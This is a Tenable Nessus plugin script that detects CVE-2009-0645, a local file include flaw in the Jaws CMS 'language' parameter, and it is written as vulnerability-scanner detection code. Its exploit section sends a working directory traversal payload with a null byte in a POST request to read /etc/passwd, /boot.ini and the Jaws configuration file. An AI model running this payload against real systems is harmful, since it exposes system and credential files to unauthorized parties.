#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35610);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2009-0645");
  script_bugtraq_id(33607);
  script_osvdb_id(52148);
  script_xref(name:"EDB-ID", value:"7976");

  script_name(english:"Jaws language Parameter Multiple Local File Includes");
  script_summary(english:"Attempts to retrieve a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to multiple local file include attacks." );
 script_set_attribute(attribute:"description", value:
"Jaws, a Framework and Content Management System for building dynamic
websites, is installed on the remote system.  

The installed version fails to filter input to the 'language'
parameter before using it to include PHP code in '/upgrade/index.php'
and '/install/index.php'.  Regardless of PHP's 'register_globals' and
'magic_quotes_gpc' settings, an unauthenticated attacker can exploit
these issues to view arbitrary files or possibly to execute arbitrary
PHP code on the remote host, subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/02/06");
 script_cvs_date("$Date: 2016/05/20 14:03:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www",80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file,'/config/JawsConfig.php');
}
else files = make_list('/etc/passwd', '/boot.ini','/config/JawsConfig.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['/config/JawsConfig.php'] = "JawsConfig.php";

if (thorough_tests) 
{ 
  dirs = make_list("/jaws", "/blog", "/html","/jaws/html",cgi_dirs());
  urls = make_list("/upgrade/index.php","/install/index.php");
}
else
{ 
 dirs = make_list(cgi_dirs());
 urls = make_list("/upgrade/index.php");
}

# Try to exploit one of the flaws to read a file.

foreach u (urls)
{
  foreach dir (dirs)
  {
    url = string(dir,u);
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res)) exit(0);
    
    if ("Welcome to the Jaws" >< res[2])
    {  
      foreach file (files)
      {    
        if ("JawsConfig.php" >< file)
         exploit = string("..",file,"%00");
        else
         exploit = string("../../../../../../../../../../../../",file,"%00");
   
        req = http_mk_post_req(
          port        : port,
          version     : 11,
          item        : url,
          add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"), 
          data        : string("language=",exploit)
         );
     
        res = http_send_recv_req(port:port, req:req);
        if (isnull(res)) exit(0);

        if (egrep(pattern:file_pats[file], string:res[2]) && "jaws/blog.css" >< res[2])
        {
          res[2] = res[2] - strstr(res[2], "?>");
  
          if (report_verbosity > 0)
          {   
            req_str = http_mk_buffer_from_req(req:req);

            if (".php" >< file)
              r = "Nessus could load a local .php file '";
             else
              r = "Nessus could retrieve the contents of file '";
 
            report = string ('\n',
             r, file,"\n", 
             "by sending the following POST request :\n\n",
             "  ", str_replace(find:'\n', replace:'\n', string:req_str),'\n'
            );
  
            if (report_verbosity > 1)
              report = string(
                 report,'\n',
                 "Here's the result : \n\n",
                 crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
                 res[2],"\n",
                 crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n" 
              );
            security_hole(port:port, extra:report);
          }
          else
              security_hole(port);
          break;
         }  
      }
    }
  }   
}
